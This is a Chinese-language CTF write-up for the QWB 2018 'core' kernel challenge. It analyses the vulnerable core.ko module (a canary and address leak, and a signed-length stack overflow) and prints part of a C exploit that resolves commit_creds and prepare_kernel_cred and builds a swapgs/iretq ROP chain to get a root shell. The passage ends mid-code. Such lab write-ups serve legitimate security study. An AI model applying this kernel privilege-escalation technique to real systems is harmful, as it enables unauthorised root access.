title="返回用户态"></a>返回用户态</h3><p>由内核态返回用户态只需要：</p><ul><li><code>swapgs</code>指令恢复用户态 GS 寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 gadget 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p>交换内核态与用户态的gs寄存器</p><h3 id="iretq-amp-amp-sysretq"><a href="#iretq-amp-amp-sysretq" class="headerlink" title="iretq&amp;&amp;sysretq"></a>iretq&amp;&amp;sysretq</h3><p>这两个指令都是用于返回用户态</p><p>其中iretq等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br><span class="line">pop cs</span><br><span class="line">pop rflags</span><br><span class="line">pop rsp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure><p>sysretq则等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>首先文件解压出来提供了四个文件,bzImage,core.cpio,start.sh和vmlinux</p><p>其中bzImage是压缩后的内核镜像,去除了大多数的调试符号</p><p>core.cpio是提供给内核的文件系统</p><p>start.sh是启动内核的脚本</p><p>vmlinux则是未经过压缩的静态链接的内核镜像,其中具有更多的调试符号,更利于调试,如果没有这个文件可以利用linus提供的<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本从bzImage中分离出来</p><p>观察以下start.sh启动脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     │ File: ./start.sh</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ qemu-system-x86_64 \</span><br><span class="line">   2   │ -m 256M \</span><br><span class="line">   3   │ -kernel ./bzImage \#指定内核镜像</span><br><span class="line">   4   │ -initrd  ./core.cpio \#指定初始的根文件系统</span><br><span class="line">   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">   6   │ -s  \#开启调试</span><br><span class="line">   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">   8   │ -nographic  \#不使用图形化界面</span><br></pre></td></tr></table></figure><p><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</code></p><ul><li><code>quiet</code>: 禁用一些冗长的启动消息，以使启动过程更为静默。</li><li><code>kaslr</code>: 表示启用内核地址空间随机化</li></ul><p>解压core.cpio后看一下其中的init文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │ mount -t proc proc /proc</span><br><span class="line">   3   │ mount -t sysfs sysfs /sys</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ /sbin/mdev -s</span><br><span class="line">   6   │ mkdir -p /dev/pts</span><br><span class="line">   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">   8   │ chmod 666 /dev/ptmx</span><br><span class="line">   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  12   │ ifconfig eth0 up</span><br><span class="line">  13   │ udhcpc -i eth0</span><br><span class="line">  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">  15   │ route add default gw 10.0.2.2 </span><br><span class="line">  16   │ insmod /core.ko</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ #poweroff -d 120 -f &amp;</span><br><span class="line">  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  20   │ echo &#x27;sh end!\n&#x27;</span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ umount /sys</span><br><span class="line">  23   │ </span><br><span class="line">  24   │ #poweroff -d 0  -f</span><br></pre></td></tr></table></figure><ul><li><p><code>mount</code>命令用于挂载文件系统</p><ul><li><code>-t</code>选项指定挂载文件系统类型</li><li><code>-o</code>挂载选项</li></ul><p>例如<code>mount -vt devpts -o gid=4,mode=620 none /dev/pts</code>,将<code>devpts</code>文件系统挂载到<code>/dev/pts</code>目录,使用<code>none</code>作为源设备,即不需要源设备文件,挂载的目录的属性为<code>组别4,权限是620</code></p></li><li><p><code>/sbin/mdev</code>是一个轻量级的设备管理工具，通常用于嵌入式 Linux 系统中，用于在系统启动时自动创建和管理设备节点。</p><ul><li><code>-s</code>  ,用于启用 <code>mdev</code> 的守护进程（daemon）模式</li></ul><p>当运行 <code>/sbin/mdev -s</code> 时，<code>mdev</code> 将以守护进程的形式运行，并在后台监听设备的变化。</p></li><li><p><code>ifconfig eth0 up</code> 是一个 Linux 命令，用于启用(激活)网络接口</p></li><li><p><code>umount</code>与<code>mount</code>相反,卸载挂载的文件系统</p></li><li><p><code>setuidgid</code> 是一个busybox提供的一个工具，用于以指定的用户ID启动程序。</p></li><li><p><code>setsid</code>是一个 Unix/Linux 命令，用于启动一个新的会话。这个命令将当前进程设置为新会话的领头进程（session leader）。通常，<code>setsid</code> 用于创建一个与父进程和之前的会话完全脱离的新会话，这对于将进程变成守护进程很有用，因为它与原始终端会话无关。</p><p><code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>作用是创建一个新的会话，执行 <code>/bin/cttyhack</code> 工具，然后以用户 ID 1000 的身份启动 <code>/bin/sh</code> shell</p></li><li><p><code>insomod</code>的作用是加载驱动模块,加载后的驱动模块会出现在<code>/sys/module/</code>中</p></li></ul><p>init中比较重要的几点是</p><ul><li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li></ul><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>检查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/core/core/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>存在canary,ida进一步静态分析</p><p>存在七个主要函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">core_release.text<span class="number">0000000000000000</span><span class="number">00000011</span><span class="number">00000000</span></span><br><span class="line">core_write.text<span class="number">0000000000000011</span><span class="number">00000052</span><span class="number">00000010</span></span><br><span class="line">core_read.text<span class="number">0000000000000063</span><span class="number">00000093</span><span class="number">00000050</span></span><br><span class="line">core_copy_func.text<span class="number">00000000000000F</span>6<span class="number">00000069</span><span class="number">00000050</span></span><br><span class="line">core_ioctl.text<span class="number">000000000000015F</span><span class="number">0000005</span>A<span class="number">00000008</span></span><br><span class="line">init_module.init.text<span class="number">00000000000001B</span>9<span class="number">00000032</span><span class="number">00000000</span></span><br><span class="line">exit_core.<span class="built_in">exit</span>.text<span class="number">00000000000001</span>EB<span class="number">00000019</span><span class="number">00000000</span></span><br></pre></td></tr></table></figure><p><strong>init_module()</strong> 注册了 <code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exit_core()</strong> 删除 <code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_ioctl()</strong> 定义了三条命令，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(v1, &amp;v4[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="type">unsigned</span> __int16)a1);    <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">QWB2018_core [master●●] cat exploit.c </span><br><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    